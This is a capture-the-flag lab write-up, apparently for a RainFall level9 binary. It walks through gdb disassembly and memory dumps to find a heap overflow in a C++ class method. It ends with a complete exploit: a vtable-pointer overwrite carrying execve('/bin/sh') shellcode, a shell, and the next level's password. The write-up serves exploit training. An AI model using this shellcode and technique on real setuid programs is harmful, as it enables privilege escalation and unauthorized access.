@@ -1,0 +1,442 @@
+level9@192.168.0.37's password:
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
+
+level9@RainFall:~$ ls -l
+-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
+
+level9@RainFall:~$ ./level9
+level9@RainFall:~$ ./level9 a
+level9@RainFall:~$ ./level9 aaaaaaaaaaaaaaaaaaaaaaaaaaaa
+level9@RainFall:~$ ./level9 a a a a a a a
+
+********************************************************************************
+No response.
+********************************************************************************
+
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+0x08048464  _init
+0x080484b0  __cxa_atexit
+0x080484b0  __cxa_atexit@plt
+0x080484c0  __gmon_start__
+0x080484c0  __gmon_start__@plt
+0x080484d0  std::ios_base::Init::Init()
+0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
+0x080484e0  __libc_start_main
+0x080484e0  __libc_start_main@plt
+0x080484f0  _exit
+0x080484f0  _exit@plt
+0x08048500  _ZNSt8ios_base4InitD1Ev
+0x08048500  _ZNSt8ios_base4InitD1Ev@plt
+0x08048510  memcpy
+0x08048510  memcpy@plt
+0x08048520  strlen
+0x08048520  strlen@plt
+0x08048530  operator new(unsigned int)
+0x08048530  _Znwj@plt
+0x08048540  _start
+0x08048570  __do_global_dtors_aux
+0x080485d0  frame_dummy
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+0x08048770  __libc_csu_init
+0x080487e0  __libc_csu_fini
+0x080487e2  __i686.get_pc_thunk.bx
+0x080487f0  __do_global_ctors_aux
+0x0804881c  _fini
+
+********************************************************************************
+Just a main. But the N function are suspicious, we didn't have any in the other level.
+It is probably a class N who contained this function. So the language used might be C++.
+********************************************************************************
+
+(gdb) info variable
+All defined variables:
+
+Non-debugging symbols:
+0x08048838  _fp_hw
+0x0804883c  _IO_stdin_used
+0x08048840  vtable for N
+0x08048850  typeinfo name for N
+0x08048854  typeinfo for N
+0x08048a44  __FRAME_END__
+0x08049a48  __init_array_start
+0x08049a4c  __CTOR_LIST__
+0x08049a4c  __init_array_end
+0x08049a50  __CTOR_END__
+0x08049a54  __DTOR_LIST__
+0x08049a58  __DTOR_END__
+0x08049a5c  __JCR_END__
+0x08049a5c  __JCR_LIST__
+0x08049a60  _DYNAMIC
+0x08049b44  _GLOBAL_OFFSET_TABLE_
+0x08049b74  __data_start
+0x08049b74  data_start
+0x08049b78  __dso_handle
+0x08049b80  _ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3
+0x08049bac  completed.6159
+0x08049bb0  dtor_idx.6161
+0x08049bb4  std::__ioinit
+
+********************************************************************************
+No named variable. But the N class reappears.
+********************************************************************************
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485f4 <+0>:	push   %ebp
+   0x080485f5 <+1>:	mov    %esp,%ebp
+   0x080485f7 <+3>:	push   %ebx
+   0x080485f8 <+4>:	and    $0xfffffff0,%esp
+   0x080485fb <+7>:	sub    $0x20,%esp
+   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
+   0x08048602 <+14>:	jg     0x8048610 <main+28>
+   0x08048604 <+16>:	movl   $0x1,(%esp)
+   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+   0x08048610 <+28>:	movl   $0x6c,(%esp)
+   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
+   0x0804861c <+40>:	mov    %eax,%ebx
+   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
+   0x08048626 <+50>:	mov    %ebx,(%esp)
+   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
+   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
+   0x08048632 <+62>:	movl   $0x6c,(%esp)
+   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+   0x0804863e <+74>:	mov    %eax,%ebx
+   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
+   0x08048648 <+84>:	mov    %ebx,(%esp)
+   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
+   0x08048654 <+96>:	mov    0x1c(%esp),%eax
+   0x08048658 <+100>:	mov    %eax,0x14(%esp)
+   0x0804865c <+104>:	mov    0x18(%esp),%eax
+   0x08048660 <+108>:	mov    %eax,0x10(%esp)
+   0x08048664 <+112>:	mov    0xc(%ebp),%eax
+   0x08048667 <+115>:	add    $0x4,%eax
+   0x0804866a <+118>:	mov    (%eax),%eax
+   0x0804866c <+120>:	mov    %eax,0x4(%esp)
+   0x08048670 <+124>:	mov    0x14(%esp),%eax
+   0x08048674 <+128>:	mov    %eax,(%esp)
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:	mov    0x10(%esp),%eax
+   0x08048680 <+140>:	mov    (%eax),%eax
+   0x08048682 <+142>:	mov    (%eax),%edx
+   0x08048684 <+144>:	mov    0x14(%esp),%eax
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:	leave
+   0x08048699 <+165>:	ret
+End of assembler dump.
+
+********************************************************************************
+A lot of call but the functions called are weird.
+********************************************************************************
+
+(gdb) disas 0x8048530
+Dump of assembler code for function _Znwj@plt:
+   0x08048530 <+0>:	jmp    *0x8049b70
+   0x08048536 <+6>:	push   $0x40
+   0x0804853b <+11>:	jmp    0x80484a0
+End of assembler dump.
+
+(gdb) disas 0x80486f6
+Dump of assembler code for function _ZN1NC2Ei:
+   0x080486f6 <+0>:	push   %ebp
+   0x080486f7 <+1>:	mov    %esp,%ebp
+   0x080486f9 <+3>:	mov    0x8(%ebp),%eax
+   0x080486fc <+6>:	movl   $0x8048848,(%eax)
+   0x08048702 <+12>:	mov    0x8(%ebp),%eax
+   0x08048705 <+15>:	mov    0xc(%ebp),%edx
+   0x08048708 <+18>:	mov    %edx,0x68(%eax)
+   0x0804870b <+21>:	pop    %ebp
+   0x0804870c <+22>:	ret
+End of assembler dump.
+
+********************************************************************************
+This two functions seems to initialize an instance of the class.
+********************************************************************************
+
+(gdb) disas 0x0804870e
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:	push   %ebp
+   0x0804870f <+1>:	mov    %esp,%ebp
+   0x08048711 <+3>:	sub    $0x18,%esp
+   0x08048714 <+6>:	mov    0xc(%ebp),%eax
+   0x08048717 <+9>:	mov    %eax,(%esp)
+   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:	mov    0x8(%ebp),%edx
+   0x08048722 <+20>:	add    $0x4,%edx
+   0x08048725 <+23>:	mov    %eax,0x8(%esp)
+   0x08048729 <+27>:	mov    0xc(%ebp),%eax
+   0x0804872c <+30>:	mov    %eax,0x4(%esp)
+   0x08048730 <+34>:	mov    %edx,(%esp)
+   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:	leave
+   0x08048739 <+43>:	ret
+End of assembler dump.
+
+********************************************************************************
+This one seems to be a method of the class who get the length of the second arg 
+(argv1 here) and memcpy it in the first arg (our first instance of our class N).
+Here we see an oportunity to overflow in our second instance of class N, who is 
+called before the ned of the function.
+So we will search the size of the buffer.
+********************************************************************************
+
+(gdb) b *main+128
+Breakpoint 1 at 0x8048674
+(gdb) run 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
+
+Breakpoint 1, 0x08048674 in main ()
+(gdb) i r
+eax            0x804a008	134520840
+ecx            0x20f21	134945
+edx            0x6	6
+ebx            0x804a078	134520952
+esp            0xbffff5e0	0xbffff5e0
+ebp            0xbffff608	0xbffff608
+esi            0x0	0
+edi            0x0	0
+eip            0x8048674	0x8048674 <main+128>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) si
+0x08048677 in main ()
+(gdb) si
+0x0804870e in N::setAnnotation(char*) ()
+(gdb) step
+Single stepping until exit from function _ZN1N13setAnnotationEPc,
+which has no line number information.
+0x0804867c in main ()
+(gdb) i r
+eax            0x804a00c	134520844
+ecx            0x7a7a7a7a	2054847098
+edx            0x804a0dc	134521052
+ebx            0x804a078	134520952
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x804867c	0x804867c <main+136>
+eflags         0x200287	[ CF PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+********************************************************************************
+We see that the register ecx was overwritten by 'zzzz' so the offset to ecx is 204,
+but that's not the info we are looking for, our purpose is to find the offset to the
+second instance of our class.
+********************************************************************************
+
+(gdb) si
+0x08048680 in main ()
+(gdb) i r
+eax            0x804a078	134520952
+ecx            0x7a7a7a7a	2054847098
+edx            0x804a0dc	134521052
+ebx            0x804a078	134520952
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x8048680	0x8048680 <main+140>
+eflags         0x200287	[ CF PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) si
+0x08048682 in main ()
+(gdb) i r
+eax            0x62626262	1650614882
+ecx            0x7a7a7a7a	2054847098
+edx            0x804a0dc	134521052
+ebx            0x804a078	134520952
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x200287	[ CF PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) si
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+
+********************************************************************************
+62 is 'b' so we have an offset of 27*4=108 to write in it.
+We will create our payload now but first we need to know the address of our two instance of N.
+********************************************************************************
+
+(gdb) b *main+40
+Breakpoint 2 at 0x804861c
+(gdb) b *main+58
+Breakpoint 3 at 0x804862e
+(gdb) b *main+74
+Breakpoint 4 at 0x804863e
+(gdb) b *main+92
+Breakpoint 5 at 0x8048650
+(gdb) run 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
+
+Starting program: /home/user/level9/level9 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
+
+Breakpoint 2, 0x0804861c in main ()
+(gdb) i r
+eax            0x804a008	134520840
+ecx            0x0	0
+edx            0xb7eec440	-1209088960
+ebx            0xb7eebff4	-1209090060
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x804861c	0x804861c <main+40>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) step
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 3, 0x0804862e in main ()
+(gdb) i r
+eax            0x804a008	134520840
+ecx            0x0	0
+edx            0x5	5
+ebx            0x804a008	134520840
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x804862e	0x804862e <main+58>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) step
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 4, 0x0804863e in main ()
+(gdb) i r
+eax            0x804a078	134520952
+ecx            0x20f21	134945
+edx            0xb7eec440	-1209088960
+ebx            0x804a008	134520840
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x804863e	0x804863e <main+74>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) step
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 5, 0x08048650 in main ()
+(gdb) i r
+eax            0x804a078	134520952
+ecx            0x20f21	134945
+edx            0x6	6
+ebx            0x804a078	134520952
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x8048650	0x8048650 <main+92>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+
+(gdb) x/55xw 0x0804a008
+0x804a008:	0x08048848	0x41414141	0x42424242	0x43434343
+0x804a018:	0x44444444	0x45454545	0x46464646	0x47474747
+0x804a028:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
+0x804a038:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
+0x804a048:	0x50505050	0x51515151	0x52525252	0x53535353
+0x804a058:	0x54545454	0x55555555	0x56565656	0x57575757
+0x804a068:	0x58585858	0x59595959	0x5a5a5a5a	0x61616161
+0x804a078:	0x62626262	0x63636363	0x64646464	0x65656565
+0x804a088:	0x66666666	0x67676767	0x68686868	0x69696969
+0x804a098:	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c	0x6d6d6d6d
+0x804a0a8:	0x6e6e6e6e	0x6f6f6f6f	0x70707070	0x71717171
+0x804a0b8:	0x72727272	0x73737373	0x74747474	0x75757575
+0x804a0c8:	0x76767676	0x77777777	0x78787878	0x79797979
+0x804a0d8:	0x7a7a7a7a	0x00000000	0x00000006
+
+********************************************************************************
+Our first instance of N is at 0x804a008.
+And our second at 0x804a078.
+We can see that there is 7*16=112 bytes between the two with the four last bytes
+containing an address to 0x08048848 who when dereferenced point to a method of the class N.
+0x0804873a in N::operator+(N&) ().
+We will overwrite this address to point to an address who point to an address who points 
+to the nopsled region of our payload. Because there is two dereferencing.
+   0x08048680 <+140>:	mov    (%eax),%eax
+   0x08048682 <+142>:	mov    (%eax),%edx
+So our payload will look like this:
+
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+"\x0c\xa0\x04\x08"
+Address + shellcode + padding + address
+4 + 55 + 49 + 4 = 112
+********************************************************************************
+
+level9@RainFall:~$ ./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A'*49 + '\x0c\xa0\x04\x08')")
+$ cd ../bonus0
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
